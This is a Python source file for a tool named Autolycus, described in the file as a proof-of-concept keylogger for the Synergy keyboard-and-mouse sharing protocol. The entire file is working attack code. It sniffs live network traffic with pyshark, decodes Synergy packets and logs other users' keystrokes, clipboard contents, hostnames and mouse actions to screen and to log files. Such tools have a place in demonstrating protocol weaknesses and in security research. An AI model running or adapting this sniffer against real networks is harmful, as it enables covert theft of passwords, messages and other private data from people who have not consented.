import pyshark
import argparse
import sys
import logging
import time
import re
import os
import socket
from threading import Thread
from collections import defaultdict
from textwrap import wrap
from fabulous import text
from colorlog import ColoredFormatter


class Autolycus(object):
    __slots__ = ["interface", "wrap_limit", "keystroke_wait_time", "redundant_wait_time", "verbose_level", "log_filename", "disable_logging", "capture", "log", "active_connections", "capturing", "temp_keystrokes", "temp_clipboard", "processing_clipboard", "processing_entering", "processing_leaving", "processing_keep_alive", "processing_unknown", "processing_nop"]

    # packet type constants
    PACKET = {
        # verbosity level 0
        "HANDSHAKE": "handshake",
        "QUERY_INFO": "qinf",
        "CLIENT_DATA": "clientdata",
        "RESET_OPTIONS": "resetoptions",
        "SET_OPTIONS": "setoptions",
        "ACK": "ack", 
        "KEYSTROKE_DOWN": "keypressed",
        "KEYSTROKE_UP": "keyreleased",
        "KEYSTROKE_REPEAT": "keyautorepeat",
        "CLIPBOARD": "clipboard",
        "CLIPBOARD_DATA": "clipboarddata",
        "ENTERING_SCREEN": "cinn",
        "LEAVING_SCREEN": "cout",
        "CLOSE_CONNECTION": "cbye",
        "CONNECTION_BUSY": "ebsy",
        # verbosity level 1
        "MOUSE_DOWN": "mousebuttonpressed",
        "MOUSE_UP": "mousebuttonreleased",
        # verbosity level 2
        "KEEP_ALIVE": "calv",
        "UNKNOWN": "unknown",
        # verbosity level 3
        "MOUSE_MOVEMENT": "mousemoved",
        "NO_OPERATION": "cnop"
    }

    # non-ASCII keycodes
    SPECIAL_KEYCODES = {
        61193: "TAB",
        61192: "BACKSPACE",
        61197: "ENTER",
        61211: "ESCAPE",
        61266: "ARROW UP",
        61268: "ARROW DOWN",
        61265: "ARROW LEFT",
        61267: "ARROW RIGHT",
        61281: "PRINT SCREEN",
        61374: "F1",
        61375: "F2",
        61376: "F3",
        61377: "F4",
        61378: "F5",
        61379: "F6",
        61380: "F7",
        61381: "F8",
        61382: "F9",
        61383: "F10",
        61384: "F11",
        61385: "F12",
        61409: "LEFT SHIFT",
        61410: "RIGHT SHIFT",
        61411: "LEFT CONTROL",
        61412: "RIGHT CONTROL",
        61413: "CAPS LOCK",
        61417: "LEFT ALT",
        61418: "RIGHT ALT",
        61419: "LEFT WINDOWS",
        61420: "RIGHT WINDOWS"
    }

    # mouse actions (possibly platform-dependent)
    MOUSE_CODES = {
        68: "CLICK",
        17485: "SCROLL WHEEL"
    }

    # logging constants
    HDSHK = 5
    SETUP = 6
    DATA = 7
    CONN = 8
    INFO = 9
    CLOSE = 10

    def __init__(self, interface, wrap_limit, keystroke_wait_time, redundant_wait_time, verbose_level, log_filename, disable_logging):
        self.interface = interface
        self.wrap_limit = wrap_limit
        self.keystroke_wait_time = keystroke_wait_time
        self.redundant_wait_time = redundant_wait_time
        self.verbose_level = verbose_level
        self.log_filename = log_filename
        self.disable_logging = disable_logging
        self.capture = pyshark.LiveCapture(interface=interface, bpf_filter="tcp")
        self.log = self.setup_logger()
        self.active_connections = set()
        self.temp_keystrokes = defaultdict(list)
        self.temp_clipboard = ""
        self.processing_clipboard = self.processing_entering = self.processing_leaving = self.processing_keep_alive = self.processing_unknown = self.processing_nop = False

    def start(self):
        self.print_banner()
        self.log.info(f"Logging activity to logs/{self.log_filename}.log")
        self.log.info("Listening for events...")
        self.listen_loop()

    def listen_loop(self):
        self.capturing = True
        try:
            for packet in self.capture.sniff_continuously():
                if "Synergy" in packet and len(packet.synergy.field_names) > 0:
                    if not self.capturing:
                        self.capture.close()

                    packet_type = packet.synergy.field_names[0]

                    if packet_type in self.PACKET.values():
                        if self.verbose_level >= 0:
                            if packet_type == self.PACKET["HANDSHAKE"]:
                                self.handle_handshake(packet)
                            elif packet_type == self.PACKET["QUERY_INFO"]:
                                self.handle_query_info(packet)
                            elif packet_type == self.PACKET["CLIENT_DATA"]:
                                self.handle_client_data(packet)
                            elif packet_type == self.PACKET["RESET_OPTIONS"]:
                                self.handle_reset_options(packet)
                            elif packet_type == self.PACKET["SET_OPTIONS"]:
                                self.handle_set_options(packet)
                            elif packet_type == self.PACKET["ACK"]:
                                self.handle_ack(packet)
                            elif packet_type == self.PACKET["KEYSTROKE_DOWN"]:
                                self.handle_keystroke(packet)
                            elif packet_type == self.PACKET["KEYSTROKE_UP"]:
                                # redundant packet, catch and ignore
                                pass
                            elif packet_type == self.PACKET["KEYSTROKE_REPEAT"]:
                                self.handle_keystroke(packet)
                            elif packet_type == self.PACKET["CLIPBOARD"]:
                                self.handle_clipboard(packet)
                            elif packet_type == self.PACKET["CLIPBOARD_DATA"]:
                                self.handle_clipboard_data(packet)
                            elif packet_type == self.PACKET["ENTERING_SCREEN"]:
                                self.handle_entering_screen(packet)
                            elif packet_type == self.PACKET["LEAVING_SCREEN"]:
                                self.handle_leaving_screen(packet)
                            elif packet_type == self.PACKET["CLOSE_CONNECTION"]:
                                self.handle_close(packet)
                            elif packet_type == self.PACKET["CONNECTION_BUSY"]:
                                self.handle_busy(packet)
                        if self.verbose_level >= 1:
                            if packet_type == self.PACKET["MOUSE_DOWN"]:
                                self.handle_mouse_down(packet)
                            elif packet_type == self.PACKET["MOUSE_UP"]:
                                # redundant packet, catch and ignore
                                pass
                        if self.verbose_level >= 2:
                            if packet_type == self.PACKET["KEEP_ALIVE"]:
                                self.handle_keep_alive(packet)
                            elif packet_type == self.PACKET["UNKNOWN"]:
                                self.handle_unknown(packet)
                        if self.verbose_level >= 3:
                            if packet_type == self.PACKET["MOUSE_MOVEMENT"]:
                                self.handle_mouse_movement(packet)
                            elif packet_type == self.PACKET["NO_OPERATION"]:
                                self.handle_nop(packet)
                    elif self.verbose_level >= 4 and len(packet.synergy.field_names) > 0:
                        packet.synergy.pretty_print()
                        print(packet.synergy.field_names)
                    
                    if packet.ip.src not in self.active_connections and packet.ip.dst not in self.active_connections:
                        self.active_connections.add(packet.ip.src)
                        self.active_connections.add(packet.ip.dst)
                        self.log.log(self.CONN, f"({packet.ip.dst} <-> {packet.ip.src}) discovered ongoing session")
                
        except Exception: pass

    def stop(self):
        self.capturing = False
        time.sleep(1)
        # send a packet to break pyshark out of its loop
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(b"", ("127.0.0.1", 12345))
        sock.close()

    def handle_handshake(self, packet):
        self.active_connections.add(packet.ip.src)
        self.log.log(self.HDSHK, f"({packet.ip.src} --> {packet.ip.dst}) establishing connection")
        self.log.log(self.DATA, f"\tVersion: Synergy v{packet.synergy.handshake_majorversion}.{packet.synergy.handshake_minorversion}")
        if ({packet.ip.src, packet.ip.dst}.issubset(self.active_connections)):
            self.log.log(self.HDSHK, f"({packet.ip.src} <-> {packet.ip.dst}) connection established")
            self.log.log(self.DATA, f"\tServer: {packet.ip.dst}")
            extras = f", hostname: {packet.synergy.handshake_client}" if "handshake_client" in packet.synergy.field_names else ""
            self.log.log(self.DATA, f"\tClient: {packet.ip.src}{extras}")

    def handle_query_info(self, packet):
        self.log.log(self.SETUP, f"({packet.ip.src} --> {packet.ip.dst}) requesting screen settings")

    def handle_client_data(self, packet):
        self.log.log(self.SETUP, f"({packet.ip.src} --> {packet.ip.dst}) confirming server screen settings")
        for field in packet.synergy._get_all_fields_with_alternates()[1:]:
            self.log.log(self.DATA, f"\t{packet.synergy._get_field_repr(field)}")

    def handle_reset_options(self, packet):
        self.log.log(self.SETUP, f"({packet.ip.src} --> {packet.ip.dst}) reset options")

    def handle_set_options(self, packet):
        self.log.log(self.SETUP, f"({packet.ip.src} --> {packet.ip.dst}) set options:")
        self.log.log(self.DATA, f"\t {packet.synergy.setoptions}")

    def handle_ack(self, packet):
        self.log.log(self.SETUP, f"({packet.ip.src} --> {packet.ip.dst}) acknowledged sent settings")

    def handle_keystroke(self, packet):
        if len(self.temp_keystrokes[packet.ip.src + packet.ip.dst]) == 0:
            self.log.log(self.INFO, f"({packet.ip.src} --> {packet.ip.dst}) sending keystrokes, collecting until {self.keystroke_wait_time} seconds of inactivity...")
            Thread(target=self.keystroke_listener, args=(packet.ip.src, packet.ip.dst)).start()
        multiplier = 1
        if "keyautorepeat" in packet.synergy.field_names:
            keycode = int(packet.synergy.keyautorepeat_keyid)
            multiplier = int(packet.synergy.keyautorepeat_repeat)
        else:
            keycode = int(packet.synergy.keypressed_keyid)
        if keycode in self.SPECIAL_KEYCODES:
            self.temp_keystrokes[packet.ip.src + packet.ip.dst].append(f" <{self.SPECIAL_KEYCODES[keycode] * multiplier}> ")
        else:
            self.temp_keystrokes[packet.ip.src + packet.ip.dst].append(chr(keycode) * multiplier)
    
    def keystroke_listener(self, src, dst):
        wait = self.keystroke_wait_time
        start_size = len(self.temp_keystrokes[src + dst])
        while wait > 0:
            if len(self.temp_keystrokes[src + dst]) != start_size:
                wait = self.keystroke_wait_time
                start_size = len(self.temp_keystrokes[src + dst])
            else:
                wait -= 1
            time.sleep(1)
        self.log.log(self.INFO, f"({src} --> {dst}) collected keystrokes:")
        [self.log.log(self.DATA, f"\t{batch}") for batch in wrap("".join(self.temp_keystrokes[src + dst]), self.wrap_limit)]
        self.temp_keystrokes[src + dst].clear()

    def handle_clipboard(self, packet):
        if not self.processing_clipboard:
            self.processing_clipboard = True
            Thread(target=self.clipboard_listener, args=(packet,)).start()

    def clipboard_listener(self, packet):
        time.sleep(self.redundant_wait_time)
        self.processing_leaving = False
        self.log.log(self.INFO, f"({packet.ip.src} --> {packet.ip.dst}) grabbing clipboard")

    def handle_clipboard_data(self, packet):
        try:
            raw = packet.synergy.get_field("clipboarddata_data").binary_value.decode(encoding="unicode_escape")
            clipboard = repr(raw).split("\\x")[-1][3:-1]
            if clipboard and len(clipboard) > 3 and not clipboard[:3].isnumeric() and clipboard != self.temp_clipboard:
                self.temp_clipboard = clipboard
                self.log.log(self.INFO, f"({packet.ip.src} --> {packet.ip.dst}) transferring clipboard data:")
                [self.log.log(self.DATA, f"\t{batch}") for batch in wrap("".join(f"{clipboard}"), self.wrap_limit)]
        except UnicodeDecodeError: pass

    def handle_entering_screen(self, packet):
        if not self.processing_entering:
            self.processing_entering = True
            Thread(target=self.entering_listener, args=(packet,)).start()

    def entering_listener(self, packet):
        time.sleep(self.redundant_wait_time)
        self.processing_entering = False
        self.log.log(self.INFO, f"({packet.ip.src} --> {packet.ip.dst}) entering screen")
        self.log.log(self.DATA, f"\tScreen X: {packet.synergy.cinn_x}")
        self.log.log(self.DATA, f"\tScreen Y: {packet.synergy.cinn_y}")

    def handle_leaving_screen(self, packet):
        if not self.processing_leaving:
            self.processing_leaving = True
            Thread(target=self.leaving_listener, args=(packet,)).start()

    def leaving_listener(self, packet):
        time.sleep(self.redundant_wait_time)
        self.processing_leaving = False
        self.log.log(self.INFO, f"({packet.ip.src} --> {packet.ip.dst}) leaving screen")

    def handle_close(self, packet):
        self.log.log(self.CLOSE, f"({packet.ip.src} --> {packet.ip.dst}) closing connection")
        self.active_connections -= {packet.ip.src, packet.ip.dst}

    def handle_busy(self, packet):
        self.log.log(self.CONN, f"({packet.ip.src} --> {packet.ip.dst}) attempting connection to busy recipient")

    def handle_mouse_down(self, packet):
        self.log.log(self.INFO, f"({packet.ip.src} --> {packet.ip.dst}) mouse action:")
        self.log.log(self.DATA, f"\t<{self.MOUSE_CODES[int(packet.synergy.mousebuttonpressed)]}>")

    def handle_keep_alive(self, packet):
        if not self.processing_keep_alive:
            self.processing_keep_alive = True
            Thread(target=self.keep_alive_listener, args=(packet,)).start()

    def keep_alive_listener(self, packet):
        time.sleep(self.redundant_wait_time)
        self.processing_keep_alive = False
        self.log.log(self.INFO, f"({packet.ip.src} --> {packet.ip.dst}) keep alive")

    def handle_unknown(self, packet):
        if not self.processing_unknown:
            self.processing_unknown = True
            Thread(target=self.unknown_listener, args=(packet,)).start()

    def unknown_listener(self, packet):
        time.sleep(self.redundant_wait_time)
        self.processing_unknown = False
        self.log.log(self.INFO, f"({packet.ip.src} --> {packet.ip.dst}) unknown")

    def handle_nop(self, packet):
        if not self.processing_nop:
            self.processing_nop = True
            Thread(target=self.nop_listener, args=(packet,)).start()

    def nop_listener(self, packet):
        time.sleep(self.redundant_wait_time)
        self.processing_nop = False
        self.log.log(self.INFO, f"({packet.ip.src} --> {packet.ip.dst}) no operation (NOP)")
    
    def handle_mouse_movement(self, packet):
        self.log.log(self.INFO, f"({packet.ip.src} --> {packet.ip.dst}) mouse movement:")
        self.log.log(self.DATA, f"\tx: {packet.synergy.mousemoved_x}, y: {packet.synergy.mousemoved_y}")

    def print_banner(self):
        BANNER_WIDTH = 115
        print("*" * BANNER_WIDTH)
        print(text.Text("Autolycus", color="#EF9C70", shadow=True, skew=3))
        print("*" * BANNER_WIDTH)
        print("Author: Michael Van Leeuwen".center(BANNER_WIDTH, " "))
        print("github.com/MJVL/Autolycus".center(BANNER_WIDTH, " "))
        print("*" * BANNER_WIDTH)

    def setup_logger(self):
        if not self.disable_logging:
            if not os.path.exists("logs"):
                os.makedirs("logs")
            logging.basicConfig(filename=f"logs/{self.log_filename}.log")
        logging.addLevelName(self.HDSHK, "HDSHK")
        logging.addLevelName(self.SETUP, "SETUP")
        logging.addLevelName(self.DATA, "DATA")
        logging.addLevelName(self.CONN, "CONN")
        logging.addLevelName(self.INFO, "INFO")
        logging.addLevelName(self.CLOSE, "CLOSE")
        formatter = ColoredFormatter(
            "%(asctime)s | %(log_color)s%(levelname)-5s%(reset)s | %(log_color)s%(reset)s%(message)s",
            datefmt="%H:%M:%S",
            reset=True,
            log_colors={
                "INFO": "green",
                "HDSHK": "green",
                "SETUP": "green",
                "DATA": "green",
                "CONN": "green",
                "CLOSE": "green",
            }
        )
        logger = logging.getLogger()
        handler = logging.StreamHandler()
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        logger.setLevel("HDSHK")
        return logger


def main():
    parser = argparse.ArgumentParser(description="A proof of concept keylogger for the Synergy application/protocol.", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("interface", help="The interface to listen on.", type=str)
    parser.add_argument("-w", "--wrap_limit", help="The max amount of characters to print on a single line when dumping keystrokes/clipboard data.", metavar="num chars", type=int, default=200)
    parser.add_argument("-k", "--keystroke_wait_time", help="The time in seconds to wait without hearing new keystrokes before printing the dump.", metavar="seconds", type=int, default=5)
    parser.add_argument("-r", "--redundant_wait_time", help="The time in seconds to wait before printing actions which commonly contain duplicates. Longer window = less duplicates.", metavar="seconds", type=int, default=1)
    parser.add_argument("-v", "--verbose", help="The level of verbosity, with each level adding more. Default = 0.\n0: keystrokes, clipboards, connection, and screen movement\n1: mouse clicks\n2: keep alives, unknowns, and random noisy packets\n3: mouse movement and NOPs\n4: any uncaught packets", metavar="level", type=int, default=0)
    parser.add_argument("-l", "--log_filename", help="The filename to log to. Default = YYYYMNDD-HHMMSS", type=str, default=time.strftime("%Y%m%d-%H%M%S"))
    parser.add_argument("-d", "--disable_logging", help="Prevent logging to a file. Will overwrite -l.", action="store_true")
    args = parser.parse_args()

    try:
        autolycus = Autolycus(args.interface, args.wrap_limit, args.keystroke_wait_time, args.redundant_wait_time, args.verbose, args.log_filename, args.disable_logging)
        autolycus.start()
    except KeyboardInterrupt:
        autolycus.stop()

if __name__ == "__main__":
    main()
